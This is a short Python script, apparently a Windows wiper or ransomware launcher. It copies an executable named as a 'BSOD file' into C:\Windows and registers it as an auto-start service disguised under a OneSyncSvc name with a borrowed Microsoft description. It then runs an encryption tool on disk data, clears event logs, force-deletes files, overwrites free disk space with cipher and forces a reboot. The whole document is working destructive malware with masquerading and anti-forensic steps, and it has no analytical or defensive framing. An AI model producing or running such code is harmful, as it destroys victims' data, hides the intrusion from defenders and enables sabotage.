import os
import shutil
import subprocess
#
#
def cmd_comand(command):
    try:
        os.system('@echo off')
        os.system(command)
    except:
        None


#Copy BSOD file to the location.
try:
    shutil.move("wintmppt.exe", 'C:\\Windows\\wintmppt.exe')
except:
    None

# Install BSOD Service and run az a administrator
bosd = "sc create OneSyncSvc_438905 binPath= C:\\windows\\wintmppt.exe start= auto"
cmd_comand(bosd)

# Add Description of the service
description_svc = ('sc description OneSyncSvc_438905 "This service provides support for viewing, sending and deletion of system-level problem reports for the Problem Reports control panel."')
cmd_comand(description_svc)


# #Encript data ot disk and Folders
encpt = "Encp.exe"
cmd_comand(encpt)

# #Clear event logs
clreventlogs = "clear_event_Logs.bat"
cmd_comand(clreventlogs)

# #clear all in the datafolder
clrt = "del /F /Q *.* && ECHO Y"
cmd_comand(clrt)

# # clear all file gaps in the disks
ciphering = 'cipher \w:C'
subprocess.run(ciphering, shell=True, capture_output=True, text=True)

# # Force reboot
reboot = "shutdown -r -t 0"
cmd_comand(reboot)
